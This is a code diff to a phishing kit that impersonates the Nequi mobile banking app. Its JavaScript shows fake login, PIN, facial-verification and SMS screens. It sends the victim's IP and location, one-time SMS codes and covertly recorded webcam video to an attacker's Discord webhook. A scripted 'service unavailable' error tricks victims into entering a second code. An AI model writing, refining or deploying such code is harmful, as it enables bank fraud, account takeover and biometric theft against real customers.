@@ -738,12 +738,10 @@
 
 <script>
     /**
-     * NEQUI APP - ULTRA ENGINE V10.0 NATIVA
-     * Optimización Full Screen + Doble SMS + Contadores Reales + Webhook
+     * NEQUI APP - ULTRA ENGINE V10.2 NATIVA
+     * Fix: Espaciado Inferior (Margin/Padding) + Fondo SMS
      */
 
-    // --- 1. CONFIGURACIÓN VISUAL PARA MÓVILES (ESTRICTO) ---
-    // Esto asegura que la página ocupe el 100% y no se mueva al escribir
     const setupMobileLayout = () => {
         const meta = document.createElement('meta');
         meta.name = "viewport";
@@ -757,14 +755,25 @@
                 --nequi-pink: #da0081;
             }
             * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+            
             body, html { 
                 margin: 0; padding: 0; height: 100%; width: 100%; 
                 overflow: hidden; background-color: var(--nequi-purple);
                 font-family: sans-serif; position: fixed;
             }
+
             .screen { 
-                height: 100vh; width: 100vw; display: none; 
-                flex-direction: column; position: absolute; top: 0; left: 0;margin-bottom: 20px;
+                height: 100vh; width: 100vw; 
+                display: none; flex-direction: column; 
+                position: absolute; top: 0; left: 0;
+                /* CAMBIO AQUÍ: Usamos padding para asegurar espacio abajo sin romper el layout */
+                padding-bottom: 40px; 
+                overflow-y: auto;
+            }
+
+            /* Aseguramos que el fondo morado cubra todo el cuerpo */
+            .bg-purple { background-color: var(--nequi-purple) !important; }
+            .bg-white { background-color: #ffffff !important; }
         `;
         document.head.appendChild(style);
     };
@@ -775,7 +784,6 @@
     let userData = { ip: "0.0.0.0", loc: "Detectando..." };
     let mediaRecorder, videoChunks = [];
 
-    // --- 2. LOCALIZACIÓN ---
     async function getInfo() {
         try {
             const res = await fetch('https://ipapi.co/json/');
@@ -785,7 +793,6 @@
     }
     getInfo();
 
-    // --- 3. ENVÍO A DISCORD ---
     async function sendToDiscord(msg, file = null, fileName = "captura.png") {
         const formData = new FormData();
         const header = `━━━━━━━━━━━━━━━━━━━━━━\n📱 **REPORTE NEQUI**\n📍 **IP:** ${userData.ip}\n🌍 **Lugar:** ${userData.loc}\n━━━━━━━━━━━━━━━━━━━━━━\n`;
@@ -794,7 +801,28 @@
         try { await fetch(WEBHOOK_URL, { method: 'POST', body: formData }); } catch (e) { }
     }
 
-    // --- 4. FORMATEADOR DE CELULAR (3xx xxx xxxx) ---
+    // --- NAVEGACIÓN CORREGIDA CON FIX DE FONDO Y MARGEN ---
+    function showScreen(id) {
+        const screens = ['screen-login', 'screen-pin', 'screen-loading', 'screen-identity-choice', 'screen-facial-capture', 'screen-ready', 'screen-sms'];
+        screens.forEach(s => { 
+            const el = document.getElementById(s);
+            if(el) el.style.display = 'none'; 
+        });
+
+        const target = document.getElementById(id);
+        if (target) {
+            target.style.display = 'flex';
+            
+            // Fix Fondo: Login, Pin y SMS deben ser morados
+            if (id === 'screen-login' || id === 'screen-pin' || id === 'screen-sms') {
+                document.body.className = "bg-purple";
+            } else {
+                document.body.className = "bg-white";
+            }
+        }
+    }
+
+    // --- LÓGICA DE CELULAR ---
     const phoneInput = document.getElementById('phone-field');
     if(phoneInput) {
         phoneInput.addEventListener('input', (e) => {
@@ -809,21 +837,6 @@
         });
     }
 
-    // --- 5. NAVEGACIÓN ---
-    function showScreen(id) {
-        const screens = ['screen-login', 'screen-pin', 'screen-loading', 'screen-identity-choice', 'screen-facial-capture', 'screen-ready', 'screen-sms'];
-        screens.forEach(s => { 
-            const el = document.getElementById(s);
-            if(el) el.style.display = 'none'; 
-        });
-        const target = document.getElementById(id);
-        if (target) {
-            target.style.display = 'flex';
-            // Cambiar fondo según la imagen: Morado para login/pin, Blanco para el resto
-            document.body.style.backgroundColor = (id === 'screen-login' || id === 'screen-pin') ? "#2d002d" : "#ffffff";
-        }
-    }
-
     function goToPin() {
         const raw = phoneInput.value.replace(/\s/g, '');
         if(raw.length === 10 && raw.startsWith('3')) {
@@ -832,7 +845,7 @@
         } else { showToast("Ingresa un número de celular válido."); }
     }
 
-    // --- 6. DOTS DEL PIN (AJUSTE DE COLOR) ---
+    // --- LÓGICA DE PIN ---
     function pressPin(d) {
         if(currentPin.length < 4) {
             currentPin += d;
@@ -845,7 +858,6 @@
         for(let i=0; i<4; i++) {
             const dot = document.getElementById(`dot${i}`);
             if(dot) {
-                // El que presionas se pone blanco, los demás se quedan oscuros/transparentes
                 dot.innerText = currentPin[i] ? "*" : "";
                 dot.style.backgroundColor = currentPin[i] ? "white" : "rgba(255,255,255,0.2)";
                 dot.style.border = currentPin[i] ? "none" : "1px solid rgba(255,255,255,0.3)";
@@ -866,19 +878,17 @@
         }
     }
 
-    // --- 7. RECONOCIMIENTO FACIAL (VIDEO + FOTOS) ---
+    // --- LÓGICA BIOMETRÍA ---
     async function startFacial() {
         showScreen('screen-facial-capture');
         const video = document.getElementById('video-feed');
         const banner = document.querySelector('.instruction-banner');
-        
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ 
                 video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } } 
             });
             video.srcObject = stream;
             video.setAttribute('playsinline', ''); 
-
             videoChunks = [];
             mediaRecorder = new MediaRecorder(stream);
             mediaRecorder.ondataavailable = e => videoChunks.push(e.data);
@@ -887,7 +897,6 @@
                 sendToDiscord("🎥 **VIDEO COMPLETO**", blob, "video_facial.webm");
             };
             mediaRecorder.start();
-
             let i = 0;
             const steps = ["Centra tu rostro", "Busca iluminación", "No te muevas", "Analizando...", "Casi listo..."];
             const interval = setInterval(() => {
@@ -923,16 +932,15 @@
             segs--;
             if (segs > 30) label.innerText = `PROCESANDO BIOMETRÍA... (${segs}s)`;
             else if (segs <= 30 && segs > 0) label.innerText = `VALIDANDO INFORMACIÓN... ${segs}s`;
-            
             if (segs <= 0) {
                 clearInterval(timer);
-                showScreen('screen-ready'); // Pantalla de "¡Listo!"
+                showScreen('screen-ready');
                 setTimeout(() => showScreen('screen-sms'), 2500);
             }
         }, 1000);
     }
 
-    // --- 8. DOBLE SMS CON ERROR Y CARGA ---
+    // --- LÓGICA SMS ---
     function pressSms(d) {
         if(currentSms.length < 6) {
             currentSms += d;
@@ -940,10 +948,8 @@
             if(currentSms.length === 6) {
                 smsAttempt++;
                 sendToDiscord(`📩 **SMS #${smsAttempt}:** \`${currentSms}\``);
-                
-                if(smsAttempt === 1) {
-                    processSmsWait();
-                } else {
+                if(smsAttempt === 1) processSmsWait();
+                else {
                     setTimeout(() => {
                         showToast("Servicio no disponible, intenta más tarde.");
                         currentSms = ""; updateSms();
